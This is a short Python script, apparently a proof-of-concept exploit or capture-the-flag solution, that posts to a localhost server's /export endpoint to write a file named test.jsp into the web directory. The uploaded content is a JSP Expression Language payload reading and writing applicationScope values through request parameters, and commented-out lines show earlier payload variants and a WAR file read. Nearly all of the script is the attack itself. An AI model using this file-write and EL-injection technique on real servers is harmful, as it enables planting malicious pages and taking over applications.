from aiohttp import request
import requests

TARGET_URL = 'http://localhost:8080'

def upload(filename,dir,content):
    data = {
        "filename":filename,
        "dir":dir,
        "content":content
    }

    res = requests.post(f"{TARGET_URL}/export",data=data)

    print(res.text)
    
#war = open('test.war','rb').read()
#upload("test.jsp",".","${param.x[param.y]} ${applicationScope[param.x]=param.x}")

#upload("test.jsp",".","${applicationScope[param.x]=param.y}")

upload("test.jsp",".","${a=applicationScope[param.x][param.y]}")